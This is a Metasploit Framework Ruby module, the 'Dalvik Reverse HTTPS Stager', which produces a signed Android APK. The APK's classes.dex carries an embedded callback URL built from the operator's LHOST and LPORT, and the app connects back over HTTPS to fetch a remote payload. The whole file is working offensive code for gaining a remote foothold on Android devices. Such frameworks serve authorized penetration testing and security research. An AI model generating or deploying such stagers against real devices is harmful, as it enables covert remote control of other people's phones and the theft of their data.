##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/uuid/options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Stager
  include Msf::Payload::Dalvik
  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Dalvik Reverse HTTPS Stager',
      'Description' => 'Tunnel communication over HTTPS',
      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'android',
      'Arch'        => ARCH_DALVIK,
      'Handler'     => Msf::Handler::ReverseHttps,
      'Stager'      => {'Payload' => ''}
    ))
  end

  def generate_jar(opts={})
    # Default URL length is 30-256 bytes
    uri_req_len = 30 + rand(256-30)
    # Generate the short default URL if we don't know available space
    if self.available_space.nil?
      uri_req_len = 5
    end

    url = "https://#{datastore["LHOST"]}:#{datastore["LPORT"]}#{luri}"
    # TODO: perhaps wire in an existing UUID from opts?
    url << generate_uri_uuid_mode(:init_java, uri_req_len)

    classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + url)

    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
                                         datastore['HandlerSSLCert'])
    if verify_cert_hash
        hash = 'WWWW' + verify_cert_hash.unpack("H*").first
        string_sub(classes, 'WWWW                                        ', hash)
    end

    apply_options(classes)

    jar = Rex::Zip::Jar.new
    jar.add_file("classes.dex", fix_dex_header(classes))
    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]
    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
    jar.build_manifest

    cert, key = generate_cert
    jar.sign(key, cert, [cert])

    jar
  end
end
